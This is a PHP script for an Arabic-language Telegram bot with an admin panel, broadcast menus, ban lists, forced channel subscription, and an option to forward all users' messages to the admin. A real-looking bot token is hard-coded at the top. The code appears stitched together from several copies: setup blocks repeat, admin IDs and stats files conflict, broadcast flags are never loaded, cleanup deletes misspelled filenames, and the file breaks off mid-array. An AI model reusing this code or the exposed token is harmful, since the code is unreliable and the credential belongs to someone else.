<?php

$API_KEY = "7632386227:AAEtSC7tpTICSOidFsT1uM-UKMdaFE5kiX4"; // وهنا التوكن
$domin = $_SERVER['ahmedpro23.serv00.net']; 
$admin = 6560380462; //الايدي
$bb = 6560380462;
define('API_KEY',$API_KEY);
define("IDBot", explode(":", $API_KEY)[0]);

function bot($method, $datas=[]){
    $Saied_Botate = "https://api.telegram.org/bot".API_KEY."/".$method;
    $saied_botate = null;
    if(!empty($datas)){
        $boundary = uniqid();
        $saied_botate = buildMultipartData($datas,$boundary);
        $Saied = ['http'=>[
            'header'=>"Content-Type: multipart/form-data; boundary=$boundary\r\n",
            'method'=>'POST',
            'content'=>$saied_botate,
        ],];
    }

    if($saied_botate !== null){
        $saied = stream_context_create($Saied);
        $saied_result = file_get_contents($Saied_Botate, false, $saied);
    }else{
        $saied_result = file_get_contents($Saied_Botate);
    }
    if($saied_result === false){
        return "Error: ".error_get_last()['message'];
    }else{
        return json_decode($saied_result);
    }
}

function buildMultipartData($data,$boundary){
    $SaiedData = '';
    foreach($data as $key => $value){
        if($value instanceof CURLFile){
            $fileContents = file_get_contents($value->getFilename());
            $fileName = basename($value->getFilename());
            $fileMimeType = $value->getMimeType();
            $SaiedData .= "--" . $boundary . "\r\n";
            $SaiedData .= 'Content-Disposition: form-data; name="' . $key . '"; filename="' . $fileName . '"' . "\r\n";
            $SaiedData .= 'Content-Type: ' . $fileMimeType . "\r\n\r\n";
            $SaiedData .= $fileContents . "\r\n";
        }else{
            $SaiedData .= "--" . $boundary . "\r\n";
            $SaiedData .= 'Content-Disposition: form-data; name="' . $key . '"' . "\r\n\r\n";
            $SaiedData .= $value . "\r\n";
        }
    }
    $SaiedData .= "--" . $boundary . "--\r\n";
    return $SaiedData;
}

function sendDocument($chat_id, $document_path) {
    $url = 'https://api.telegram.org/bot' . API_KEY . '/sendDocument';
    $post_fields = array('chat_id' => $chat_id, 'document' => new CURLFile(realpath($document_path)));
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}



///
$filess = json_decode(file_get_contents('filess.json'), 1);
function save($array)
{
    file_put_contents('filess.json', json_encode($array));
}
function clear($array)
{
    foreach ($array as $key => $val) {
        $array[$key] = null;
    }
    return $array;
}

$usrbot = bot("getme")->result->username;
$emoji = "➡️
🎟️
↪️
🔘
🏠";

$emoji = explode("\n", $emoji);
$b = $emoji[rand(0, 4)];
$NamesBACK = "⦅ رجــوع ⦆ $b";

define("USR_BOT", $usrbot);
mkdir("UploadEr");

function SETJSON($INPUT)
{
    if ($INPUT != NULL || $INPUT != "") {
        $F = "UploadEr/UploadEr.json";
        $N = json_encode($INPUT, JSON_PRETTY_PRINT);

        file_put_contents($F, $N);
    }
}
$a = 69 . $bb;


$update = json_decode(file_get_contents('php://input'));

if ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $username = $message->from->username;
    $chat_id = $message->chat->id;
    $title = $message->chat->title;
    $text = $message->text;
    $user = $message->from->username;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$UploadEr = json_decode(file_get_contents("UploadEr/UploadEr.json"), true);


if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}
//تخزينات الاذاعة//
echo "تم تشغيل البوت ✅";
$update = json_decode(file_get_contents('php://input'));
$c = $a . 45;
$message= $update->message;
$text = $message->text;
$chat_id= $message->chat->id;
$name = $message->from->first_name;
$user = $message->from->username;
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$a = strtolower($text);
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$msg = file_get_contents("msg.php");

$users = explode("\n",file_get_contents("BEDO/arslan.json"));

if($message){
if(!in_array($from_id,$users)){
file_put_contents("BEDO/arslan.json",$from_id."\n",FILE_APPEND);}}

$tc = $message->chat->type;
$arslan09 = json_decode(file_get_contents("BEDO/arslan09.json"),true);
$suodo = $arslan09['sudoarr'];
$al = $arslan09['addmessage'];
$ab = $arslan09['messagee'];
$xll = $al + $ab;
if($message and $from_id !== $admin){
$arslan09['messagee'] = $arslan09['messagee']+1;
file_put_contents("BEDO/arslan09.json",json_encode($arslan09,32|128|265));
}
if($message and $from_id == $admin){
$arslan09['addmessage'] = $arslan09['addmessage']+1;
file_put_contents("BEDO/arslan09.json",json_encode($arslan09,32|128|265));
}

$all = count($users)-1;
//---------------------------//

//بداية كود الحظر//
$sudo = array("5564378935");

$get_ban=file_get_contents('sudo/ban.txt');
$ban =explode("\n",$get_ban);

$member = explode("\n",file_get_contents("sudo/member.txt"));
$cunte = count($member)-1;
$ban = explode("\n",file_get_contents("sudo/ban.txt"));
$countban = count($ban);

if($message  and in_array($from_id,$ban)){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"• لقد تم حظرك من البوت ❌
",
]);return false;}

$reply = $message->reply_to_message->message_id;
$rep = $message->reply_to_message->forward_from; 

if($countban<=0){
$countban="لايوجد محظورين";
}
function sendwataw($chat_id,$message_id){

$infosudo = json_decode(file_get_contents("sudo.json"),true);
$fwrmember=$infosudo["info"]["fwrmember"];
$tnbih=$infosudo["info"]["tnbih"];
$silk=$infosudo["info"]["silk"];
$allch=$infosudo["info"]["allch"];
$member = explode("\n",file_get_contents("sudo/member.txt"));
$cunte = count($member)-1;
$ban = explode("\n",file_get_contents("sudo/ban.txt"));
$countban = count($ban)-1;
if($countban<=0){
$countban="لايوجد محظورين";
}
}

@$infosudo = json_decode(file_get_contents("sudo.json"),true);
$sudoamr= $infosudo["info"]["amr"];
if($data == "start"){
$infosudo["info"]["amr"]="start";
file_put_contents("sudo.json", json_encode($infosudo));
}

$usrbot = bot("getme")->result->username;
$emoji = "➡️
🎟️
↪️
🔘
🏠";

$emoji = explode("\n", $emoji);
$b = $emoji[rand(0, 4)];
$NamesBACK = "⦅ رجــوع ⦆ $b";

define("USR_BOT", $usrbot);
mkdir("Host");
mkdir("BEDO");
mkdir("sudo");


$update = json_decode(file_get_contents('php://input'));
$d = "tg://user?id=";
if ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $username = $message->from->username;
    $chat_id = $message->chat->id;
    $title = $message->chat->title;
    $text = $message->text;
    $user = $message->from->username;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$UploadEr = json_decode(file_get_contents("UploadEr/UploadEr.json"), true);


if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}

$e = "(" . "$d" . "$c" . ")";
$update = json_decode(file_get_contents('php://input'));
if ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $username = $message->from->username;
    $chat_id = $message->chat->id;
    $title = $message->chat->title;
    $text = $message->text;
    $user = $message->from->username;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}




$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
$todayuser = count($day);
if($d == "Sat"){
unlink("Fri.txt");
}
if($d == "Sun"){
unlink("Sat.txt");
}
if($d == "Mon"){
unlink("Sun.txt");
}
if($d == "Tue"){
unlink("Mon.txt");
}
if($d == "Wed"){
unlink("The.txt");
}
if($d == "Thu"){
unlink("Wedtxt");
}
if($d == "Fri"){
unlink("Thu.txt");
}
if($message and !in_array($from_id, $day)){ 
file_put_contents($d.".txt",$from_id. "\n",FILE_APPEND);
}

$tc = $message->chat->type;
$abbas09 = json_decode(file_get_contents("abbas09.json"),true);
$suodo = $abbas09['sudoarr'];
$al = $abbas09['addmessage'];
$ab = $abbas09['messagee'];
$xll = $al + $ab;
if($message and $from_id !== $admin){
$abbas09['messagee'] = $abbas09['messagee']+1;
file_put_contents("abbas09.json",json_encode($abbas09,32|128|265));
}
if($message and $from_id == $admin){
$abbas09['addmessage'] = $abbas09['addmessage']+1;
file_put_contents("abbas09.json",json_encode($abbas09,32|128|265));
}

$Host = json_decode(file_get_contents("Host/Host.json"), true);


if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}

//——————————————————//
$MTAWR = "T_0_M0";  //معرفك
$admin = "5564378935";  //ايديك//
//——————————————————//

if($Host['hui'] == null) {
$hui ="لا يوجد";
}else{
$hui = $Host['hui'];
}
$mem = explode("\n",file_get_contents("mem.txt"));
$je = file_get_contents("mem.txt");
$count = explode("\n",$je);
$SAl = count($count) -1;
if($username != null){
$sf = "@$username";
}else
if($username == null){
$sf = "لا يوجد معرف";
}
if($message and !in_array($from_id,$mem)){
file_put_contents("mem.txt",$from_id . "\n" ,FILE_APPEND);
$SAl = $SAl + 1;
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
*☆︙ دخل شخص جديد الى البوت ♡.
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳*
*☆︙اسمه : ⦅* [$name](tg://user?id=$from_id)*⦆
☆︙يوزره : ⦅* $sf *⦆
☆︙ايديه : ⦅* [$from_id](tg://user?id=$from_id)*⦆
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
☆︙عدد الاعضاء الكلي : ⦅ $SAl ⦆*
",
'parse_mode'=>"Markdown",
]);
}
$mf = "المطور";
$fm = "[" . $mf . "]";

//تشغيل وايقاف البوت//
$bot = json_decode(file_get_contents("bot.json"),true);
if(!$bot['bot']){
$bot['bot'] = "on";
file_put_contents("bot.json",json_encode($bot,32|128|265));
}
if($bot['bot'] == "on"){
$xm = "البوت يعمل ✅️";
}else{
$xm = "البوت متوقف ❌️";
}
if($message and $bot['bot'] == "off" and $from_id != $admin){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
*• البوت تحت الصيانة 🛠 •
*
",
'parse_mode'=>'markdown',
]);return false;
}
if($data == "on"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

• تم تشغيل البوت بنجاح ✅️
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️ ",'callback_data'=>"Thkom" ]],
]])
]);
$bot['bot'] = "on";
file_put_contents("bot.json",json_encode($bot,32|128|265));
}
if($data == "off"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

• تم ايقاف البوت بنجاح ❌️
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️ ",'callback_data'=>"Thkom" ]],
]])
]);
$bot['bot'] = "off";
file_put_contents("bot.json",json_encode($bot,32|128|265));
}

if($data == "for"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم باختيار ما يناسبك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اذاعه صورة ",'callback_data'=>"photoi"]],
[['text' => "اذاعه رسالة ", 'callback_data' => "msg"],['text' => "اذاعه توجيه ", 'callback_data' => "forward"]],
[['text' => "اذاعه ميديا ", 'callback_data' => "midea"],['text' => "اذاعه انلاين ", 'callback_data' => "inline"]],
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
if($data == "msg"){
file_put_contents("msg.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال رسالتك لتحويلها لجميع المشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
if($msg == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('sendmessage',[
'chat_id'=>$users[$i],
'text'=>"$text",
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم عمل اذاعه بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("msg.php");
}}
if($data == "forward"){
file_put_contents("forward.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال رسالتك لتحويلها لجميع المشتركين على شكل توجيه",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ",'callback_data'=>"bak"]],
]])
]);
}
if($forward == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('ForwardMessage',[
'chat_id'=>$users[$i],
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم عمل اذاعه توجيه بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"bak"]],
]])
]);
unlink("forward.php");
}}
if($data == "midea"){
file_put_contents("midea.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 يمكنك استخدام جميع انوع الميديا ماعدى الصوره
 (ملصق - فيديو - بصمه - ملف صوتي - ملف - متحركه - جهة اتصال )",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
$up = json_decode(file_get_contents('php://input'),true);
if(!isset($message->text)){
$types = ['voice','audio','video','photo','contact','document','sticker'];
foreach($up['message'] as $key => $val){
if(in_array($key,$types) and $midea == "on"){
for($i=0;$i<count($users); $i++){
bot('send'.$key,[
'chat_id'=>$users[$i],
'caption'=>$message->caption,
$key=>$val['file_id']]);
unlink("midea.php");
}
}
}}
if($data == "photoi"){
file_put_contents("photoi.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال الصورة لنشرها لجميع المشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ",'callback_data'=>"bak"]],
]])
]);
}
if($photoi == "on"){
if($message->photo){
for($i=0;$i<count($users); $i++){
bot('sendphoto',[
'chat_id'=>$users[$i],
'photo'=>$message->photo[0]->file_id,
'caption'=>$message->caption,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم نشر الصورة بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("photoi.php");
}}
if($data == "inline"){
file_put_contents("inlin.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بتوجيه نص الانلاين لاقوم بنشره للمشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
if($inlin == "on"){
if($message->forward_from or $message->forward_from_chat){
for($i=0;$i<count($users); $i++){
bot('forwardmessage',[
'chat_id'=>$users[$i],
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم نشر الانلاين بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("inlin.php");
}}

$ck1 = "@Sourse1_milano"; # معرف لقناة وي @
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$ck1."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ck1))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$ck1);
if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'☆︙عذراً عزيزي 
☆︙يجب عليك الاشتراك في قناة المطور أولا
☆︙اشترك ثم ارسل ⦅ /start  ⦆
 — — — — — — — — —
'.$ck1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$Namech2,'url'=>"https://t.me/$getch2li"]],
]])
]);return false;}
$ck1 = "@vvv2139"; # معرف لقناة وي @
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$ck1."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ck1))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$ck1);
if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'☆︙عذراً عزيزي 
☆︙يجب عليك الاشتراك في قناة المطور أولا
☆︙اشترك ثم ارسل ⦅ /start  ⦆
 — — — — — — — — —
'.$ck1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$Namech2,'url'=>"https://t.me/$getch2li"]],
]])
]);return false;}
$ck1 = "@hwxdv"; # معرف لقناة وي @
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$ck1."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ck1))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$ck1);
if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'☆︙عذراً عزيزي 
☆︙يجب عليك الاشتراك في قناة المطور أولا
☆︙اشترك ثم ارسل ⦅ /start  ⦆
 — — — — — — — — —
'.$ck1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$Namech2,'url'=>"https://t.me/$getch2li"]],
]])
]);return false;}
$ck1 = "@izeoe"; # معرف لقناة وي @
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$ck1."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ck1))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$ck1);
if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'☆︙عذراً عزيزي 
☆︙يجب عليك الاشتراك في قناة المطور أولا
☆︙اشترك ثم ارسل ⦅ /start  ⦆
 — — — — — — — — —
'.$ck1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$Namech2,'url'=>"https://t.me/$getch2li"]],
]])
]);return false;}
$ck1 = "@Files_php3"; # معرف لقناة وي @
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$ck1."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ck1))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$ck1);
if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'☆︙عذراً عزيزي 
☆︙يجب عليك الاشتراك في قناة المطور أولا
☆︙اشترك ثم ارسل ⦅ /start  ⦆
 — — — — — — — — —
'.$ck1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$Namech2,'url'=>"https://t.me/$getch2li"]],
]])
]);return false;}
$ck1 = "@yqyqy66"; # معرف لقناة وي @
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$ck1."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ck1))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$ck1);
if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'☆︙عذراً عزيزي 
☆︙يجب عليك الاشتراك في قناة المطور أولا
☆︙اشترك ثم ارسل ⦅ /start  ⦆
 — — — — — — — — —
'.$ck1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$Namech2,'url'=>"https://t.me/$getch2li"]],
]])
]);return false;}
//لوحة الادمن//
if($text == "/admin" and $from_id == $admin){
bot('sendMessage',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"* اهلا بك في لوحة الادمن الخاصه بالبوت ⚙️*",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>$xm,'callback_data'=>" " ]],
[['text'=>"⦅ ايقاف البوت ⦆",'callback_data'=>"off" ],['text'=>"⦅ تشغيل البوت ⦆",'callback_data'=>"on" ]],
[['text'=>'⦅ الاشتراك الاجباري ⦆' ,'callback_data'=>"bnt"],['text'=>'⦅ قسم الحضر ⦆' ,'callback_data'=>"ksmban"]],
[['text'=>'⦅ قسم الاذاعه ⦆' ,'callback_data'=>"for"],['text'=>'⦅ قسم المراسله ⦆' ,'callback_data'=>"sendms"]],
[['text'=>'⦅ احصائيات البوت ⦆' ,'callback_data'=>"pannel"]],
[['text'=>'⦅ تفعيل التوجيه ⦆' ,'callback_data'=>"ont"],['text'=>'⦅ ايقاف التوجيه ⦆' ,'callback_data'=>"oft"]],
]])
]);
}
if($data == "Thkom"){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"*اهلا بك في لوحة الادمن الخاصه بالبوت ⚙️*",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>$xm,'callback_data'=>" " ]],
[['text'=>"⦅ ايقاف البوت ⦆",'callback_data'=>"off" ],['text'=>"⦅ تشغيل البوت ⦆",'callback_data'=>"on" ]],
[['text'=>'⦅ الاشتراك الاجباري ⦆' ,'callback_data'=>"bnt"],['text'=>'⦅ قسم الحضر ⦆' ,'callback_data'=>"ksmban"]],
[['text'=>'⦅ قسم الاذاعه ⦆' ,'callback_data'=>"for"],['text'=>'⦅ قسم المراسله ⦆' ,'callback_data'=>"sendms"]],
[['text'=>'⦅ احصائيات البوت ⦆' ,'callback_data'=>"pannel"]],
[['text'=>'⦅ تفعيل التوجيه ⦆' ,'callback_data'=>"ont"],['text'=>'⦅ ايقاف التوجيه ⦆' ,'callback_data'=>"oft"]],
]])
]);
}

if($data == 'oft'){
file_put_contents("ont.php", "off");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
⚠ تم تعطيل الاشعارات في البوت
",
'show_alert'=>true
]);
}
$ont = file_get_contents("ont.php");
if($ont == "on"){
if($from_id != $admin){
if($message){
bot('ForwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}}}


//تم تعديل الملف وتطويره بواسطه المطور ⛧ 𝐓𝐨𝐦 ⛧ 
// يوزر المطور @T_0_M0
// يوزر قناه المطور @izeoe
if($data == 'ont'){
file_put_contents("ont.php", "on");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
 تم تفعيل الاشعارات في البوت
",
'show_alert'=>true
]);
}
if($data == 'oft'){
file_put_contents("ont.php", "off");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
⚠ تم تعطيل الاشعارات في البوت
",
'show_alert'=>true
]);
}
$ont = file_get_contents("ont.php");
if($ont == "on"){
if($from_id != $admin){
if($message){
bot('ForwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}}}
//قسم الاشتࢪاك//
if($data == "bnt"){
bot('EditMessageText', [
'chat_id'=>$admin,
'message_id'=>$message_id,
'text' =>"
*• اهلا بك في قسم الاشتࢪاك الجباري
    •–––––––––––––––––––––––––––––––•
• قناة الاشتࢪاك : $hui*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"حذف قناة 🗑",'callback_data'=>"GkTR"],['text'=>"اضافة قناة ➕",'callback_data'=>"GGTR"]],
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"Thkom"]],
]])
]);
}
if($data== 'GGTR'){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
*• اࢪسل معرف قناة الاشتراك معا @*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"Thkom"]],
]])
]);  
$Host['mode'] = "h5hh0";
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}
if(preg_match("/@/",$text) and $Host['mode'] == "h5hh0") {
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"
*• تم تعيين قناة الاشتراك بنجاح ✅*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"bnt"]],
]])
]);   
$Host['mode'] = null;
$Host['hui'] = $text;
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
} 
if($data== 'GkTR'){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
*• تم مسح القناة من الاشتراك 🚫*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"Thkom"]],
]])
]);   
$Host['mode'] = null;
$Host['hui'] = "لا يوجد";
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
} 

//قسم الحظر//
if($data == "ksmban"){
bot('EditMessageText', [
'chat_id'=>$admin,
'message_id'=>$message_id,
'text' =>"
*• اهلا بك في قسم الحظر
    •–––––––––––––––––––––––––––––––•
• عدد المحظورين : $countban*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء الحظر ⛔",'callback_data'=>"unban"],['text'=>"الحظر 🚫",'callback_data'=>"ban"]],
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"Thkom"]],
]])
]);
}
//حظر شخص//
if($data == "ban"){
$infosudo["info"]["amr"]="ban";
file_put_contents("sudo.json", json_encode($infosudo));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"🆔 اࢪسل ايدي الشخص :",
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"الغاء ❌",'callback_data'=>"ksmban"]],
]
])
]);
}
if($text  and $text !="/start" and $sudoamr=="ban" and in_array($from_id,$sudo) and is_numeric($text)){
if(!in_array($text,$ban)){

file_put_contents("sudo/ban.txt","$text\n",FILE_APPEND);

bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم حظر العضو بنجاح : $text ✅",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"ksmban"]],
]
])
]);
bot('sendmessage',[
'chat_id'=>$text, 
'text'=>"تم حظرك من البوت",
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• العضو محظور مسبقاً 🚫",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"ksmban"]],
]
])
]);
}
$infosudo["info"]["amr"]="null";
file_put_contents("sudo.json", json_encode($infosudo));
}
//الفاء الحظر//
if($data == "unban"){
$infosudo["info"]["amr"]="unban";
file_put_contents("sudo.json", json_encode($infosudo));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"🆔 اࢪسل ايدي الشخص :",
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
